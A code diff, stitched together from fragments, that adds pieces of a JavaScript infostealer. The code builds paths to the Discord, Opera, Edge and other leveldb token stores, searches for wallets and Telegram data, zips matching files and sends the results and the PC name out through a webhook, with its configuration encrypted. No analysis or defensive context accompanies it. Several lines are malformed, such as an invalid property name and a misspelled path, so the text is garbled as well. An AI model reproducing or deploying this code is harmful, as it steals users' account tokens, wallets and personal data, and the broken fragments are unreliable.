@@ -1,0 +1,33 @@
+var paths = {
+                'Discord': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discord\\Local Storage\\leveldb\\',
+                'Discord Canary': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discordcanary\\Local Storage\\leveldb\\',
+                'Lightcord': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Lightcord\\Local Storage\\leveldb\\',
+                'Discord PTB': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discordptb\\Local Storage\\leveldb\\',
+                'Opera': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
+                'Opera GX': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+                'Amigo': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Amigo\\User Data\\Loc...
+_tmp_5.embeds = [client.utils.webhook.createEmbed({
+                        "title": `Telegram | Result`,
+                        "description": `\`\`\`${description}\`\`\``,
+                    })]
+t =
+                t +
+                this._keyStr.charAt(s) +
+                this._keyStr.charAt(o) +
+                this._keyStr.charAt(u) +
+                this._keyStr.charAt(a)
+await client.utils.webhook.sendToWebhook(
+                {
+                    "embeds": [client.utils.webhook.createEmbed({
+                        "title": `💰 Wallet search | Result`,
+                        "description": `\`\`\`${description}\`\`\``,
+                    })],
+                })
+_tmp_1.Microsoft Edge = client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\'
+client.utils.jszip.createTxt(
+                `\\${type}\\${key.toUpperCase()}.txt`,
+                `${found_keywords}\n${text}`
+              )
+_tmp_3.🆔 PC Name = client.utils.encryption.decryptData(
+          client.config.user.username
+        )
